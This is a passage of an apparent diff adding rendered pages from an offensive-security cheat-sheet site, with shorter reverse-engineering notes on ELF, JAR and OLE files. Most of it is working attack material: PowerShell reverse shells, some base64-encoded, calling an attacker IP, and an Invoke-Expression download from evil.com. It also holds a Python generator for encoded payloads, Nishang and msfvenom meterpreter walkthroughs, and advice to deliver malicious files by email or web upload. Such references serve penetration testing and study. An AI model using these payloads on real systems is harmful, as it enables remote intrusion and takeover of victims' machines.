+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="n">powershell</span> <span class="nb">Invoke-Expression</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://evil.com/revshell.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c"># Base64 encoded payload</span>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="n">powershell</span> <span class="n">-e</span> <span class="n">JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTAuMC4wLjEnLDEyMzQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI</span><span class="p">+</span><span class="n">JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc</span><span class="p">+</span><span class="n">ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk</span><span class="p">=</span>
+</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>
+</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="c"># Base64 encoded payload (contains null character between each character)</span>
+</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="n">powershell</span> <span class="n">-e</span> <span class="n">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMAAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA</span><span class="p">==</span>
+</span></code></pre></div>
+<h3 id="bypass-av-antivirus">Bypass AV (Antivirus)</h3>
+<ul>
+<li><a href="https://github.com/rexpository/powercat-v2.0">powercat</a></li>
+<li><a href="https://github.com/Sn1r/Nim-Reverse-Shell">Nim Reverse Shell</a></li>
+<li><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part7/#command-execution-to-shell">Custom Python Script</a></li>
+</ul>
+<div class="language-py highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="ch">#!/usr/bin/env python</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="kn">import</span> <span class="nn">base64</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="kn">import</span> <span class="nn">sys</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;usage : </span><span class="si">%s</span><span class="s1"> ip port&#39;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="n">payload</span><span class="o">=</span><span class="s2">&quot;&quot;&quot;</span>
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="s2">$c = New-Object System.Net.Sockets.TCPClient(&#39;</span><span class="si">%s</span><span class="s2">&#39;,</span><span class="si">%s</span><span class="s2">);</span>
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="s2">$s = $c.GetStream();[byte[]]$b = 0..65535|</span><span class="si">%%{0}</span><span class="s2">;</span>
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="s2">while(($i = $s.Read($b, 0, $b.Length)) -ne 0){</span>
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a><span class="s2">    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);</span>
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="s2">    $sb = (iex $d 2&gt;&amp;1 | Out-String );</span>
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a><span class="s2">    $sb = ([text.encoding]::ASCII).GetBytes($sb + &#39;ps&gt; &#39;);</span>
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a><span class="s2">    $s.Write($sb,0,$sb.Length);</span>
+</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a><span class="s2">    $s.Flush()</span>
+</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a><span class="s2">};</span>
+</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a><span class="s2">$c.Close()</span>
+</span><span id="__span-36-20"><a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a><span class="s2">&quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span><span id="__span-36-21"><a id="__codelineno-36-21" name="__codelineno-36-21" href="#__codelineno-36-21"></a>
+</span><span id="__span-36-22"><a id="__codelineno-36-22" name="__codelineno-36-22" href="#__codelineno-36-22"></a><span class="n">byte</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-16-le&#39;</span><span class="p">)</span>
+</span><span id="__span-36-23"><a id="__codelineno-36-23" name="__codelineno-36-23" href="#__codelineno-36-23"></a><span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>
+</span><span id="__span-36-24"><a id="__codelineno-36-24" name="__codelineno-36-24" href="#__codelineno-36-24"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;powershell -exec bypass -enc </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">b64</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p>Then execute it and write to a file.</p>
+<div class="language-py highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># we can specify arbitrary file format for Windows such as .bat, .cmd, etc.</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="n">python3</span> <span class="n">generate</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="o">.</span><span class="n">bat</span>
+</span></code></pre></div>
+<p>Start a listener for receiving incoming requests. Specify the port which was given the previous command.</p>
+<div class="language-py highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span>
+</span></code></pre></div>
+<p>After that, upload <code>shell.bat</code> to target website.</p>
+<p><br /></p>
+<h2 id="nishang">Nishang</h2>
+<p><strong><a href="https://github.com/samratashok/nishang">Nishang</a></strong> is the Offensive PowerShell for red team, penetration testing and offensive security.</p>
+<h3 id="1-preparing-the-payload-in-your-local-machine">1. Preparing the Payload in Your Local Machine</h3>
+<p>First off, copy the payload to the current working directory.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>cp<span class="w"> </span>/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1<span class="w"> </span>./shell.ps1
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>mv<span class="w"> </span>Invoke-PowerShellTcp.ps1<span class="w"> </span>shell.ps1
+</span></code></pre></div>
+<p>Add the following code to the final line in the payload (shell.ps1).</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span>  <span class="n">-IPAddress</span> <span class="p">&lt;</span><span class="n">your-local-ip</span><span class="p">&gt;</span> <span class="n">-Port</span> <span class="n">4444</span>
+</span></code></pre></div>
+<h3 id="2-opening-wev-server-in-your-local-machine">2. Opening Wev Server in Your Local Machine</h3>
+<p>To download the payload and execute the reverse shell in the target machine, open the web server in your local machine.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</span></code></pre></div>
+<h3 id="3-start-a-listener">3. Start a Listener</h3>
+<p>And start a listener for receiving incoming requests in our local machine.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<h3 id="4-download-the-payload-and-executing-reverse-shell">4. Download the Payload and Executing Reverse Shell</h3>
+<p>In the target machine, download the local-hosted payload and run reverse shell.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>cmd<span class="w"> </span>/c<span class="w"> </span>powershell<span class="w"> </span>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://&lt;your-local-ip&gt;:8000/shell.ps1&#39;</span><span class="o">)</span>
+</span></code></pre></div>
+<hr />
+<p>title: Reverse Shell with Metasploit
+description: We can create a reverse shell payload using Msfvenom and listen for reverse connection with Msfconsole.
+tags:
+    - Privilege Escalation
+    - Reverse Shell
+refs:
+date: 2024-01-26
+draft: false</p>
+<hr />
+<h2 id="generate-reverse-shell-payload">Generate Reverse Shell Payload</h2>
+<h3 id="1-create-a-payload-using-msfvenom">1. Create a Payload using MsfVenom</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1"># Linux</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell.elf
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c1"># Windows</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell.exe
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>aspx<span class="w"> </span>-o<span class="w"> </span>shell.aspx
+</span></code></pre></div>
+<h3 id="2-start-listener-using-msfconsole">2. Start Listener using MsfConsole</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>msfconsole
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>msf&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/handler
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c1"># Linux</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>msf&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>linux/x86/meterpreter/reverse_tcp
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="c1"># Windows</span>
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>msf&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="c1"># or</span>
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>msf&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a>
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a>msf&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>lhost<span class="w"> </span><span class="m">10</span>.0.0.1
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a>msf&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>lport<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a>msf&gt;<span class="w"> </span>run
+</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a>meterpreter&gt;<span class="w"> </span>shell
+</span></code></pre></div>
+<h3 id="3-send-the-generated-file-to-target-machine">3. Send the Generated File to Target Machine</h3>
+<p>After that, we need to send the generated malicious file to target machine somehow such as below:</p>
+<ul>
+<li>Send email with this file.</li>
+<li>Upload this file to target web server.</li>
+</ul>
+<h2 id="then-a-user-in-target-machine-executes-this-file-we-may-be-able-to-get-a-shell-of-target-system">Then a user in target machine executes this file, we may be able to get a shell of target system.</h2>
+<p>title: Reverse Shell with Pwncat
+description: Pwncat is a reverse and bind shell handler.
+tags:
+    - Privilege Escalation
+    - Reverse Shell
+    - Windows
+refs:
+date: 2023-12-23
+draft: false</p>
+<hr />
+<p>It can be downloaded from <a href="https://pwncat.org/">here</a>.<br />
+For listening from remote connection, run the following command.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>pwncat-cs<span class="w"> </span>-lp<span class="w"> </span><span class="m">4444</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="c1"># For Windows target</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>pwncat-cs<span class="w"> </span>-m<span class="w"> </span>windows<span class="w"> </span>-lp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="commands">Commands</h2>
+<p>After reverse connecting, we can execute commands either local or remote.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># Switch between Local and Remote shell</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>Ctrl+D
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="c1"># Upload a file to target machine (e.g. upload example.txt from local to remote)</span>
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="o">(</span><span class="nb">local</span><span class="o">)</span><span class="w"> </span>upload<span class="w"> </span>./example.txt<span class="w"> </span>/tmp/example.txt
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="sb">```</span>---
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>title:<span class="w"> </span>Reversing<span class="w"> </span>ELF<span class="w"> </span><span class="o">(</span>Executable<span class="w"> </span>and<span class="w"> </span>Linking<span class="w"> </span>Format<span class="o">)</span>
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>description:<span class="w"> </span>ELF<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>file<span class="w"> </span>format<span class="w"> </span><span class="k">for</span><span class="w"> </span>executables<span class="w"> </span>of<span class="w"> </span>Linux.
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>tags:
+</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="w">    </span>-<span class="w"> </span>Reverse<span class="w"> </span>Engineering
+</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>refs:
+</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>date:<span class="w"> </span><span class="m">2024</span>-02-18
+</span><span id="__span-47-13"><a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a>draft:<span class="w"> </span><span class="nb">false</span>
+</span><span id="__span-47-14"><a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a>---
+</span><span id="__span-47-15"><a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a>
+</span><span id="__span-47-16"><a id="__codelineno-47-16" name="__codelineno-47-16" href="#__codelineno-47-16"></a><span class="c1">## Static Analysis</span>
+</span><span id="__span-47-17"><a id="__codelineno-47-17" name="__codelineno-47-17" href="#__codelineno-47-17"></a>
+</span><span id="__span-47-18"><a id="__codelineno-47-18" name="__codelineno-47-18" href="#__codelineno-47-18"></a><span class="sb">```</span>sh
+</span><span id="__span-47-19"><a id="__codelineno-47-19" name="__codelineno-47-19" href="#__codelineno-47-19"></a><span class="c1"># -a: All</span>
+</span><span id="__span-47-20"><a id="__codelineno-47-20" name="__codelineno-47-20" href="#__codelineno-47-20"></a>readelf<span class="w"> </span>./sample<span class="w"> </span>-a
+</span><span id="__span-47-21"><a id="__codelineno-47-21" name="__codelineno-47-21" href="#__codelineno-47-21"></a><span class="c1"># -p: Dump the contents of section</span>
+</span><span id="__span-47-22"><a id="__codelineno-47-22" name="__codelineno-47-22" href="#__codelineno-47-22"></a>readelf<span class="w"> </span>./sample<span class="w"> </span>-p<span class="w"> </span>.data
+</span><span id="__span-47-23"><a id="__codelineno-47-23" name="__codelineno-47-23" href="#__codelineno-47-23"></a>readelf<span class="w"> </span>./sample<span class="w"> </span>-p<span class="w"> </span>.text
+</span><span id="__span-47-24"><a id="__codelineno-47-24" name="__codelineno-47-24" href="#__codelineno-47-24"></a>readelf<span class="w"> </span>./sample<span class="w"> </span>-p<span class="w"> </span>.interp
+</span><span id="__span-47-25"><a id="__codelineno-47-25" name="__codelineno-47-25" href="#__codelineno-47-25"></a>
+</span><span id="__span-47-26"><a id="__codelineno-47-26" name="__codelineno-47-26" href="#__codelineno-47-26"></a><span class="c1"># Change MSB &lt;=&gt; LSB by editing binary number.</span>
+</span><span id="__span-47-27"><a id="__codelineno-47-27" name="__codelineno-47-27" href="#__codelineno-47-27"></a>hexedit<span class="w"> </span>./sample
+</span><span id="__span-47-28"><a id="__codelineno-47-28" name="__codelineno-47-28" href="#__codelineno-47-28"></a><span class="o">(</span>MSB<span class="o">)</span><span class="w"> </span>7F<span class="w"> </span><span class="m">45</span><span class="w"> </span>4C<span class="w"> </span><span class="m">46</span><span class="w">  </span><span class="m">02</span><span class="w"> </span><span class="m">02</span><span class="w"> </span><span class="m">01</span><span class="w"> </span>...<span class="w"> </span>&lt;<span class="o">=</span>&gt;<span class="w"> </span><span class="o">(</span>LSB<span class="o">)</span><span class="w"> </span>7F<span class="w"> </span><span class="m">45</span><span class="w"> </span>4C<span class="w"> </span><span class="m">46</span><span class="w">  </span><span class="m">02</span><span class="w"> </span><span class="m">01</span><span class="w"> </span><span class="m">01</span><span class="w"> </span>...
+</span><span id="__span-47-29"><a id="__codelineno-47-29" name="__codelineno-47-29" href="#__codelineno-47-29"></a>
+</span><span id="__span-47-30"><a id="__codelineno-47-30" name="__codelineno-47-30" href="#__codelineno-47-30"></a><span class="c1"># Display shared object dependencies</span>
+</span><span id="__span-47-31"><a id="__codelineno-47-31" name="__codelineno-47-31" href="#__codelineno-47-31"></a>ldd<span class="w"> </span>./sample
+</span></code></pre></div>
+<hr />
+<p>title: Reversing JAR File
+description: JAR (Java Archive) file can be reversed using some tools.
+tags:
+    - Reverse Engineering
+refs:
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="code-analysis_1">Code Analysis</h2>
+<p>We can use <strong><code>jdgui</code></strong> GUI tool.</p>
+<h2 id="jd-gui"><div class="language-sh highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>jd-gui
+</span></code></pre></div></h2>
+<p>title: Reversing OLE
+description: OLE is a mechanism that allows users to create and edit documents containing items or "objects" created by multiple applications.
+tags:
+    - Reverse Engineering
+refs:
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="oledump">Oledump</h2>
+<p>It dumps the information of the OLE files.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>oledump.py<span class="w"> </span>example.doc
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="c1"># -s: stream number to analyze</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c1"># -d: dump</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>oledump.py<span class="w"> </span>-s<span class="w"> </span><span class="m">8</span><span class="w"> </span>-d<span class="w"> </span>example.doc
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>oledump.py<span class="w"> </span>-s<span class="w"> </span><span class="m">9</span><span class="w"> </span>-d<span class="w"> </span>example.doc
+</span></code></pre></div>
+<p>Then decrypt the output using online tools like CyberChef.</p>
+<p><br /></p>
+<h2 id="olevba">Olevba</h2>
